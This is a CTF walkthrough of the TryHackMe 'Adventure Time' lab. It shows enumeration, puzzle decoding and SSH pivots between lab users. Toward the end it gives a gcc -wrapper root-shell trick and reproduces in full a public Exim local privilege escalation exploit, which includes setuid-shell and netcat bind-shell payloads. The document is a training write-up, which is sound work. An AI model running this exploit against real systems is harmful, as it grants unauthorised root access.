---
title: Adventure Time 🐢
tags:
  - Enumeration
  - Decrypting
  - Telnet
  - Stego
  - CVE
  - TryHackMe
---
![](Pasted%20image%2020240531223618.png)

> *Probably my favorite cartoon series of all time*

First of all, we add the machine to known hosts like:

```shell
sudo echo "10.10.27.72 adventure.thm" | sudo tee -a /etc/hosts
```

Then I performed an Nmap scan:

```shell
nmap -sC -T4 -p- adventure.thm > sC.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 22:39 CEST
Nmap scan report for adventure.thm (10.10.27.72)
Host is up (0.050s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.74.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r--    1 ftp      ftp       1401357 Sep 21  2019 1.jpg
| -r--r--r--    1 ftp      ftp        233977 Sep 21  2019 2.jpg
| -r--r--r--    1 ftp      ftp        524615 Sep 21  2019 3.jpg
| -r--r--r--    1 ftp      ftp        771076 Sep 21  2019 4.jpg
| -r--r--r--    1 ftp      ftp       1644395 Sep 21  2019 5.jpg
|_-r--r--r--    1 ftp      ftp         40355 Sep 21  2019 6.jpg
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 58:d2:86:99:c2:62:2d:95:d0:75:9c:4e:83:b6:1b:ca (RSA)
|   256 db:87:9e:06:43:c7:6e:00:7b:c3:bc:a1:97:dd:5e:83 (ECDSA)
|_  256 6b:40:84:e6:9c:bc:1c:a8:de:b2:a1:8b:a3:6a:ef:f0 (ED25519)
80/tcp    open  http
|_http-title: 404 Not Found
443/tcp   open  https
|_http-title: You found Finn
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=adventure-time.com/organizationName=Candy Corporate Inc./stateOrProvinceName=Candy Kingdom/countryName=CK
| Not valid before: 2019-09-20T08:29:36
|_Not valid after:  2020-09-19T08:29:36
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```

As `anonymous` login is allowed, I'll start in port `21`. Connect via ftp `ftp anonymous@adventure.thm`

```shell
ftp> ls
+229 Entering Extended Passive Mode (|||43148|)
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp       1401357 Sep 21  2019 1.jpg
-r--r--r--    1 ftp      ftp        233977 Sep 21  2019 2.jpg
-r--r--r--    1 ftp      ftp        524615 Sep 21  2019 3.jpg
-r--r--r--    1 ftp      ftp        771076 Sep 21  2019 4.jpg
-r--r--r--    1 ftp      ftp       1644395 Sep 21  2019 5.jpg
-r--r--r--    1 ftp      ftp         40355 Sep 21  2019 6.jpg
```

I downloaded all the images. At a first sight, they just look like normal images, but then I looked for metadata.
- More info in [Steganografy notes 🐅](/notes/stego.md)

Using `exiftool` all the images had a piece of binary encrypted code:

```
1.jpg -> 01111001 01101111 01110101 00100000 -> you
2.jpg -> 01110010 01100101 01100001 01101100 01101100 01111001 00100000 -> really
3.jpg -> 01101100 01101001 01101011 01100101 00100000 -> like
4.jpg -> 01110100 01101111 00100000 -> to
5.jpg -> 01110000 01110101 01111010 01111010 01101100 01100101 00100000 -> puzzle
6.jpg -> 01100100 01101111 01101110 00100111 01110100 00100000 01111001 01100001 -> don't ya
```

> Rabbit hole... `-_-`

As I didn't find anything in the ftp, I jumped to the `443`:

![](Pasted%20image%2020240531225114.png)

Let's try to find **Jake**. I performed some enumeration using [dirsearch 📁](/notes/tools/dirsearch.md).

```shell
dirsearch -u https://adventure.thm/  # this scan found nothing
# So I decided to perform a more detailed one
dirsearch -u https://adventure.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[REDACTED]
[23:04:45] Starting:                     
[23:07:17] 301 -  319B  - /candybar  ->  https://adventure.thm/candybar/ 
```

So I search for `https://10.10.27.72/candybar/` and found:

![](Pasted%20image%2020240531230903.png)

We've found a `base32` encoded message, so I went to [Cyberchef](https://cyberchef.org/) to decode it:

> The encoded message was also in the source code of the page: `KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===`

It gave me as result what seemed to be a `ROT13` message encoded, so I went to [dcode.fr](https://www.dcode.fr/rot-cipher) and decrypted this:

![](Pasted%20image%2020240531231539.png)

It clearly indicates me to check the SSL certificate, so I went to it:

![](Pasted%20image%2020240531231900.png)

Now we've got another domain: `land-of-ooo.com`, so we add it to the known hosts. We found Jake!!

![](Pasted%20image%2020240531232230.png)

So it's time to perform another enumeration with [dirsearch 📁](/notes/tools/dirsearch.md) again:

```shell
dirsearch -u https://land-of-ooo.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[REDACTED]
[23:23:12] Starting:    
[23:25:31] 301 -  322B  - /yellowdog  ->  http://land-of-ooo.com/yellowdog/ 
```

So let's find out what's inside `/yellowdog`:

![](Pasted%20image%2020240531232705.png)

So again I'll do more enumeration inside the `/yellowdog` directory:

```shell
dirsearch -u https://land-of-ooo.com/yellowdog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[REDACTED]
[23:27:48] Starting: yellowdog/                      
[23:34:29] 301 -  334B  - /yellowdog/bananastock  ->  http://land-of-ooo.com/yellowdog/bananastock/
```

So I checked the `/yellowdog/bananastock` directory:

![](Pasted%20image%2020240531233541.png)

> Again in the page source was the encrypted message: `_/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__`

It seems like some kind of morse code doesn't it? Again, I came back to check [Cyberchef](https://cyberchef.org/):

![](Pasted%20image%2020240531234329.png)

> It said `THE BANANAS ARE THE BEST!!!`

So again I decided to do a further enumeration inside that subdirectory (because I haven't enough info yet):

```shell
dirsearch -u https://land-of-ooo.com/yellowdog/bananastock -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[REDACTED]
[23:45:27] Starting: yellowdog/bananastock/                  
[23:59:01] 301 -  343B  - /yellowdog/bananastock/princess  ->  http://land-of-ooo.com/yellowdog/bananastock/princess/
```

New subdirectory found: `/yellowdog/bananastock/princess`

![](Pasted%20image%2020240601000026.png)

If we take a look at the page source we find the following:

![](Pasted%20image%2020240601000119.png)

```shell
Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166

Key = my cool password
IV = abcdefghijklmanopqrstuvwxyz
Mode = CBC
Input = hex
Output = raw
```

> It seems to be AES, so I went again to https://cyberchef.org/ to decrypt the message:

![](Pasted%20image%2020240601000846.png)

So now, we know that the password for port `31337` is `ricardio`:
- I used `telnet` to connect to that port

![](Pasted%20image%2020240601001320.png)

So now I connected via ssh to the machine (use the banannas' password):

```shell
ssh apple-guards@land-of-ooo.com
```

We can get the `flag1`:

![](Pasted%20image%2020240601001556.png)

I looked what was inside `mbox`:

![](Pasted%20image%2020240601003332.png)

So I'll search for any file hid by the user `marceline`:

```shell
find / -type f -user "marceline" 2>/dev/null

/etc/fonts/helper
```

![](Pasted%20image%2020240601003640.png)

> It seems like Vigenère cipher, so I went to [cryptii](https://cryptii.com/pipes/vigenere-cipher) 

![](Pasted%20image%2020240601004332.png)

And got `Abadeer`

![](Pasted%20image%2020240601004408.png)

> Another password `My friend Finn` for user `marceline`

We can now log in as `marceline` and get `flag2`:

![](Pasted%20image%2020240601004533.png)

Then, I investigaated a file called `I_got_a_secret.txt`, which contained:

```text
Hello Finn,

I heard that you pulled a fast one over the banana guards.
B was very upset hahahahaha.
I also heard you guys are looking for BMO's resetcode.
You guys broke him again with those silly games?

You know I like you Finn, but I don't want to anger B too much.
So I will help you a little bit...

But you have to solve my little puzzle. Think you're up for it?
Hahahahaha....I know you are.

111111111100100010101011101011111110101111111111011011011011000001101001001011111111111111001010010111100101000000000000101001101111001010010010111111110010100000000000000000000000000000000000000010101111110010101100101000000000000000000000101001101100101001001011111111111111111111001010000000000000000000000000001010111001010000000000000000000000000000000000000000000001010011011001010010010111111111111111111111001010000000000000000000000000000000001010111111001010011011001010010111111111111100101001000000000000101001111110010100110010100100100000000000000000000010101110010100010100000000000000010100000000010101111100101001111001010011001010010000001010010100101011100101001101100101001011100101001010010100110110010101111111111111111111111111111111110010100100100000000000010100010100111110010100000000000000000000000010100111111111111111110010100101111001010000000000000001010
```

I thought that the message could be Binary, but it wasn't, so after minutes of crying I found [spoon programming language decoder](https://www.dcode.fr/spoon-language)

![](Pasted%20image%2020240601005232.png)

> It decoded: `The magic word you are looking for is ApplePie`

So now we can perform again the telnet conexion to the port 31337 with the new magic word:

```shell
telnet land-of-ooo.com 31337
```

We get another password:

![](Pasted%20image%2020240601005609.png)

> User `peppermint-butler` has the password `That Black Magic`

We can find `flag3` in its home directory:

![](Pasted%20image%2020240601005759.png)

There was an image in its home directory, which I downloaded to my machine using **scp**:

```shell
scp -P 22 peppermint-butler@land-of-ooo.com:/home/peppermint-butler/butler-1.jpg adventure_time
```

![](Pasted%20image%2020240601010113.png)

> *¿Another rabbit hole?* It seems to be :(

So I decided to search inside the machine a file owned by the user `peppermint`:

```shell
find / -type f -user peppermint-butler 2>/dev/null

[REDACTED]
/etc/php/zip.txt
/usr/share/xml/steg.txt
```

The `steg.txt` contained:

```text
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.

So I need to keep this safe.

The password of my secret file is 'ToKeepASecretSafe'
```

The `zip.txt` contained:

```text
I need to keep my secrets safe.
There are people in this castle who can't be trusted.
Those banana guards are not the smartest of guards.
And that Marceline is a friend of princess Bubblegum,
but I don't trust her.

So I need to keep this safe.

The password of my secret file is 'ThisIsReallySave'
```

So I extracted data from the previous image:

```shell
steghide extract -sf butler-1.jpg # with passwd: ToKeepASecretSafe
# then
unzip secrets.zip # with passwd: ThisIsReallySave
```

Inside the extracted `secrets.txt` was:

```text
[0200 hours][upper stairs]
I was looking for my arch nemesis Peace Master, 
but instead I saw that cowering little puppet from the Ice King.....gunter.
What was he up to, I don't know.
But I saw him sneaking in the secret lab of Princess Bubblegum.
To be able to see what he was doing I used my spell 'the evil eye' and saw him.
He was hacking the secret laptop with something small like a duck of rubber.
I had to look closely, but I think I saw him type in something.
It was unclear, but it was something like 'The Ice King s????'.
The last 4 letters where a blur.

Should I tell princess Bubblegum or see how this all plays out?
I don't know.......
```

So we should do some brute forcing to `The Ice King s????`, but I've seen the series I can say that he `sucks` haha.

So we can login as `gunter` and get `flag4`:

![](Pasted%20image%2020240601011319.png)

I noticed that this user is part of the `gcc` so technically it can create a root shell. If we do the following:

```shell
/usr/bin/gcc-5 -wrapper /bin/sh,-s .
```

Now we just need to log in as the bubblegum princess. So in a previous image she was worried about gunter finding her secrets in her mail. The mail is called `exim4` and we can find an exploit in [Exploit-db](https://www.exploit-db.com/exploits/46996):

```bash
#!/bin/bash
METHOD="setuid" # default method
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'
PAYLOAD_NETCAT='${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost'

# usage instructions
function usage()
{
  echo "$0 [-m METHOD]"
  echo
  echo "-m setuid : use the setuid payload (default)"
  echo "-m netcat : use the netcat payload"
  echo
  exit 1
}

# payload delivery
function exploit()
{
  # connect to localhost:25
  exec 3<>/dev/tcp/localhost/60000

  # deliver the payload
  read -u 3 && echo $REPLY
  echo "helo localhost" >&3
  read -u 3 && echo $REPLY
  echo "mail from:<>" >&3
  read -u 3 && echo $REPLY
  echo "rcpt to:<$PAYLOAD>" >&3
  read -u 3 && echo $REPLY
  echo "data" >&3
  read -u 3 && echo $REPLY
  for i in {1..31}
  do
     echo "Received: $i" >&3
  done
  echo "." >&3
  read -u 3 && echo $REPLY
  echo "quit" >&3
  read -u 3 && echo $REPLY
}

# print banner
echo
echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'
echo 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'
echo

# parse command line
while [ ! -z "$1" ]; do
  case $1 in
     -m) shift; METHOD="$1"; shift;;
     * ) usage
     ;;
  esac
done
if [ -z $METHOD ]; then
  usage
fi

# setuid method
if [ $METHOD = "setuid" ]; then

  # prepare a setuid shell helper to circumvent bash checks
  echo "Preparing setuid shell helper..."
  echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c
  gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null
  if [ $? -ne 0 ]; then
     echo "Problems compiling setuid shell helper, check your gcc."
     echo "Falling back to the /bin/sh method."
     cp /bin/sh /tmp/pwned
  fi
  echo

  # select and deliver the payload
  echo "Delivering $METHOD payload..."
  PAYLOAD=$PAYLOAD_SETUID
  exploit
  echo

  # wait for the magic to happen and spawn our shell
  echo "Waiting 5 seconds..."
  sleep 5
  ls -l /tmp/pwned
  /tmp/pwned

# netcat method
elif [ $METHOD = "netcat" ]; then

  # select and deliver the payload
  echo "Delivering $METHOD payload..."
  PAYLOAD=$PAYLOAD_NETCAT
  exploit
  echo

  # wait for the magic to happen and spawn our shell
  echo "Waiting 5 seconds..."
  sleep 5
  nc -v 127.0.0.1 31337

# print help
else
  usage
fi
```

> Note that I modified the port (there was a 25 before) and the service is currently running on port 60000.
> Also take into account that you need to run it like: `./shell.sh -m setuid`


And we are root and we can get the `flag5`:

```text
cat /home/bubblegum/Secrets/bmo.txt

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░▄██████████████████████▄░░░░
░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
░░░░█░▄██████████████████▄░█░░░░
░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
░█▌░█░▀██████████████████▀░█░▐█░
░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
░█░░█░████████████░░░░░██░░█░░█░
░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
░░░░▀██████████████████████▀░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░


Secret project number: 211243A
Name opbject: BMO
Rol object: Spy

In case of emergency use resetcode: tryhackme{HIDDEN}


-------

Good job on getting this code!!!!
You solved all the puzzles and tried harder to the max.
If you liked this CTF, give a shout out to @n0w4n.
```

==Machine pwned!==

